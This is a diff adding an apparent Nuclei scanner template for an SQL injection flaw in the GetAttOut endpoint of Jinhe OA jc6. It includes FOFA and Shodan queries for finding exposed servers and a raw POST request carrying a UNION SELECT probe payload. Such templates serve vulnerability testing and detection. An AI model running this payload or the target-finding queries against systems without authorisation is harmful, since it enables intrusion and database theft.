@@ -1,0 +1,32 @@
+id: jinher-oa-jc6-getattout-sqli
+
+info:
+  name: 金和 OA jc6 GetAttOut - sqli
+  author: leadlife
+  severity: high
+  description: Jinhe OA's GetAttOut interface has an SQL injection vulnerability that allows attackers to read sensitive information from the database.
+  reference:
+    - https://github.com/jjjj1029056414/selfpoc/blob/7a66c01dcac7dde6fe9e4df50284002e62c0c05c/jinhe-getattout-sql.py
+  metadata:
+    verified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+    shodan-query: 'http.html:"/jc6/platform/sys/login"'
+  tags: jinher,oa,sqli
+
+http:
+  - raw:
+      - |
+        POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Connection: close
+ 
+        1' union select null,null,111*111,null,null,null--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"attOEndTime","success",'12321')
